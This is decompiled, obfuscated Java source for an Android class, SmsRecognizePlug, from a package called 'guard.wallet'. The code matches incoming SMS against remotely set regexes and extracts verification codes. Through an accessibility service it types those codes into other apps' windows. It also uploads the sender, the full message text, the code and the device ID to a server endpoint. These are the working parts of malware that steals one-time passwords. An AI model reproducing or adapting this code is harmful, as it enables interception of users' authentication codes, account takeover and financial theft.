package com.guard.wallet.resp;

import a1.q;
import android.support.annotation.NonNull;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.entity.UiObjectCollection;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.http.f;
import com.guard.wallet.http.i;
import com.guard.wallet.http.l;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.h;
import java.io.Serializable;
import java.util.Objects;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import k.a;

public class SmsRecognizePlug implements Serializable {
   private static final String SMS_RECOGNIZE_TOPIC = "android.intent.action.SMS_RECOGNIZE";
   private static final String TAG = "SmsRecognizePlug";
   private Integer autoFill;
   private CombineFilter combineFilter;
   private String contentRegExp;
   private String id;
   private String senderRegExp;
   private String suitClassName;
   private String suitPackageName;

   public SmsRecognizePlug() {
   }

   public SmsRecognizePlug(String var1, String var2, String var3, String var4, String var5, CombineFilter var6, Integer var7) {
      this.id = var1;
      this.suitPackageName = var2;
      this.suitClassName = var3;
      this.senderRegExp = var4;
      this.contentRegExp = var5;
      this.combineFilter = var6;
      this.autoFill = var7;
   }

   private void autoFill(String var1) {
      if (this.combineFilter != null && Objects.equals(this.autoFill, 1) && !q.B(var1) && MyAccessibilityService.P() != null && this.suitWindow()) {
         a var5 = this.combineFilter.toGlobalSelector(null);
         UiObject var4 = MyAccessibilityService.Q();
         if (var5 != null && var4 != null) {
            UiObjectCollection var6 = var5.r(var4);
            if (var6 != null && var6.size() > 0) {
               int var3 = var6.size();
               int var2 = 0;
               if (var3 == 1) {
                  var6.get(0).setText(var1);
               } else if (var6.size() == var1.length()) {
                  while (var2 < var6.size()) {
                     var6.get(var2).setText(String.valueOf(var1.charAt(var2)));
                     var2++;
                  }
               }
            }
         }
      }
   }

   private boolean matchSender(String var1) {
      if (q.B(var1)) {
         return false;
      } else if (!q.B(this.senderRegExp)) {
         boolean var2;
         try {
            var2 = Pattern.compile(this.senderRegExp).matcher(var1).matches();
         } catch (Exception var3) {
            q.s("SmsRecognizePlug", var3);
            return false;
         }

         return var2;
      } else {
         return true;
      }
   }

   private void postDeviceSmsRecognize(SmsMessageVO var1, String var2) {
      if (var1 != null && !q.B(var1.getSender()) && !q.B(var1.getContent()) && !q.B(var2)) {
         DeviceSmsRecognizeVO var3 = new DeviceSmsRecognizeVO();
         var3.setPlugId(this.id);
         var3.setSender(var1.getSender());
         var3.setContent(var1.getContent());
         var3.setRecognizeContent(var2);
         String var4 = l.a;
         String var5 = h.l("deviceId");
         if (!q.B(var5)) {
            var3.setDeviceId(var5);
            f var6 = new f();
            new i().h(var3, "/api/deviceSmsRecognize/post.json", var6);
         }
      }
   }

   private boolean suitWindow() {
      return MyAccessibilityService.P() != null
         && Objects.equals(MyAccessibilityService.N(), this.suitPackageName)
         && (q.B(this.suitClassName) || Objects.equals((String)MyAccessibilityService.v.get(), this.suitClassName));
   }

   @Override
   public boolean equals(Object var1) {
      if (this == var1) {
         return true;
      } else if (var1 != null && this.getClass() == var1.getClass()) {
         var1 = var1;
         return Objects.equals(this.id, var1.id);
      } else {
         return false;
      }
   }

   public CombineFilter getCombineFilter() {
      return this.combineFilter;
   }

   public String getContentRegExp() {
      return this.contentRegExp;
   }

   public String getId() {
      return this.id;
   }

   public String getSenderRegExp() {
      return this.senderRegExp;
   }

   public String getSuitClassName() {
      return this.suitClassName;
   }

   public String getSuitPackageName() {
      return this.suitPackageName;
   }

   @Override
   public int hashCode() {
      return Objects.hash(this.id);
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public String matchRecognizeContent(String var1) {
      if (q.B(var1)) {
         return null;
      } else if (!q.B(this.contentRegExp)) {
         Exception var10000;
         label31: {
            Matcher var3;
            try {
               var3 = Pattern.compile(this.contentRegExp).matcher(var1);
            } catch (Exception var5) {
               var10000 = var5;
               boolean var10001 = false;
               break label31;
            }

            while (true) {
               boolean var2;
               try {
                  if (!var3.find()) {
                     return null;
                  }

                  var1 = var3.group("SmsCode");
                  var2 = q.B(var1);
               } catch (Exception var4) {
                  var10000 = var4;
                  boolean var8 = false;
                  break;
               }

               if (!var2) {
                  return var1;
               }
            }
         }

         Exception var6 = var10000;
         q.s("SmsRecognizePlug", var6);
         return null;
      } else {
         return var1;
      }
   }

   public void offer(SmsMessageVO var1) {
      if (var1 != null && !q.B(var1.getSender()) && !q.B(var1.getContent()) && this.matchSender(var1.getSender())) {
         String var2 = this.matchRecognizeContent(var1.getContent());
         if (!q.B(var2)) {
            this.autoFill(var2);
            this.postDeviceSmsRecognize(var1, var2);
         }
      }
   }

   public void setCombineFilter(CombineFilter var1) {
      this.combineFilter = var1;
   }

   public void setContentRegExp(String var1) {
      this.contentRegExp = var1;
   }

   public void setId(String var1) {
      this.id = var1;
   }

   public void setSenderRegExp(String var1) {
      this.senderRegExp = var1;
   }

   public void setSuitClassName(String var1) {
      this.suitClassName = var1;
   }

   public void setSuitPackageName(String var1) {
      this.suitPackageName = var1;
   }

   @NonNull
   @Override
   public String toString() {
      StringBuilder var1 = new StringBuilder("SmsRecognizePlug{id=");
      var1.append(this.id);
      var1.append(", suitPackageName='");
      var1.append(this.suitPackageName);
      var1.append("', suitClassName='");
      var1.append(this.suitClassName);
      var1.append("', senderRegExp='");
      var1.append(this.senderRegExp);
      var1.append("', contentRegExp='");
      var1.append(this.contentRegExp);
      var1.append("', combineFilter=");
      var1.append(this.combineFilter);
      var1.append('}');
      return var1.toString();
   }
}
